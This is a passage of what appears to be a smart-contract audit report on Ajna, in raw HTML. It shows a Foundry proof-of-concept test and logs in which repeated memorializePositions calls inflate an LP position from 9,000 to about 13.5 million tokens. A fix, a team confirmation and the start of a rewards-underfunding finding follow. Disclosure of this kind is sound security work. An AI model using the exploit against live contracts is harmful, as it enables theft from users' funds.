class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Assert that the initial and ending balances are equal.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">intialLPBalance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">finalLPBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>For reference the log outputs that display the overall change in the users position are the following:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"> Pool lp balances before:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2550: 3000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2551: 3000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2552: 3000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> PositionManger lp balances before:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2550: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2551: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2552: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> &lt;--- Repeatedly invoke memorializePositions with a min allowance set for each tx ---&gt;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> Pool lp balances after:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2550: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2551: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2552: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> PositionManger lp balances after:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2550: 4501500000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2551: 4501500000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bucket 2552: 4501500000000000000000000 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Error: a == b not satisfied [uint]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Expected: 13504500000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      Actual: 9000000000000000000000</span></span></code></pre>\n<p>The test case simulates a user that has created a position by providing 9,000 tokens as liquidity into a pool depositing 3,000 tokens, each, into price buckets 2550, 2551, and 2552. An NFT is then minted for the user. The test case then iteratively approves the PositionManager contract for an allowance of 1 token for each price bucket and invokes the memorializePositions function, repeating these steps until the Pool lp balance for their positions are 0. As can be seen by the log output, the value of the position per price bucket dramatically increases with the position in each bucket being valued at 4,501,500 tokens by the end of the test. In total, the user’s position has increased in value from 9,000 tokens to 13,504,500 tokens.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It is recommended to implement a check within the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170\">memorializePositions function</a> that will ensure that a user has specified an allowance at least equal to their lp balance at each respective index, reverting with a custom error if not true. For example, the function could be refactored to the following where the mentioned check is implemented <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L189\">here</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">memorializePositions</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MemorializePositionsParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">EnumerableSet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UintSet</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positionIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IPool</span><span class=\"mtk1\">   </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">  = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">poolKey</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexesLength</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">indexesLength</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">index</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// record bucket index at which a position has added liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// slither-disable-next-line unused-return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpBalance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lenderInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check that specified allowance is at least equal to the lp balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lpAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">allowance</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">lpBalance</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AllowanceTooLow</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check for previous deposits</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// check that bucket didn&#39;t go bankrupt after prior memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_bucketBankruptAfterDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// if bucket did go bankrupt, zero out the LP tracked by position manager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// update token position LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">lpBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// set token&#39;s position deposit time to the original lender&#39;s deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// save position in storage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">position</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update pool LP accounting and transfer ownership of LP to PositionManager contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MemorializePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/256#issuecomment-1555117255\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-08-claiming-accumulated-rewards-while-the-contract-is-underfunded-can-lead-to-a-loss-of-rewards\" style=\"position:relative;\"><a href=\"#h-08-claiming-accumulated-rewards-while-the-contract-is-underfunded-can-lead-to-a-loss-of-rewards\" aria-label=\"h 08 claiming accumulated rewards while the contract is underfunded can lead to a loss of rewards permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/251\">[H-08] Claiming accumulated rewards while the contract is underfunded can lead to a loss of rewards</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/251\">aviggiano</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/498\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/441\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/436\">Jerry0x</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/423\">tsvetanovv</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/384\">Audinarey</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/378\">kenta</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/361\">0xcm</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/326\">patitonar</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/307\">sakshamguruji</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/301\">BGSecurity</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/292\">Audit_Avengers</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/264\">mrvincere</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/237\">bytes032</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/197\">devscrooge</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/186\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/155\">Dug</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/135\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/124\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/119\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/116\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/114\">0xTheC0der</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/93\">ABAIKUNANBAEV</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/19\">TS</a></em></p>\n<p>The claimable rewards for an NFT staker are capped at the Ajna token balance at the time of claiming, which can lead to a loss of rewards if the <code>RewardsManager</code> contract is underfunded with Ajna tokens.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Loss of rewards if the <code>RewardsManager</code> contract is underfunded with Ajna tokens.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>RewardsManager</code> contract keeps track of the rewards earned by an NFT staker. The accumulated rewards are claimed by calling the <code>RewardsManager.claimRewards</code> function. Internally, the <code>RewardsManager._claimRewards</code> function transfers the accumulated rewards to the staker.</p>\n<p>However, the transferrable amount of Ajna token rewards are capped at the Ajna token balance at the time of claiming. If the accumulated rewards are higher than the Ajna token balance, the claimer will receive fewer rewards than expected. The remaining rewards cannot be claimed at a later time as the <code>RewardsManager</code> contract does not keep track of the rewards that were not transferred.</p>\n<p><strong>Note</strong></p>\n<p>This issue was already reported on <a href=\"https://github.com/sherlock-audit/2023-01-ajna-judging/issues/120\">Sherlock’s audit contest</a>, and was marked as <a href=\"https://github.com/ajna-finance/audits\"><code>Fixed</code></a> by the Ajna team (Issue M-8).</p>\n<p>Nevertheless, the problem still exists, as it can be seen through the following test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..6642a4e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -582,6 +582,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             epochToClaim_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // @audit-issue rewardsEarned (ClaimReward event) is not necessarily what&#39;s transferred (Transfer event)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit ClaimRewards(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             msg.sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             ajnaPool_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -812,6 +813,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that rewards earned isn&#39;t greater than remaining balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // if remaining balance is greater, set to remaining balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 ajnaBalance = IERC20(ajnaToken).balanceOf(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // @audit-issue rewardsEarned (ClaimReward event) is not necessarily what&#39;s transferred (Transfer event)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (rewardsEarned_ &gt; ajnaBalance) rewardsEarned_ = ajnaBalance;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (rewardsEarned_ != 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol b/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 93fe062..74a70d5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -162,6 +162,8 @@ abstract contract RewardsDSTestPlus is IRewardsManagerEvents, ERC20HelperContrac</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 currentBurnEpoch = IPool(pool).currentBurnEpoch();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         vm.expectEmit(true, true, true, true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit ClaimRewards(from, pool, tokenId, 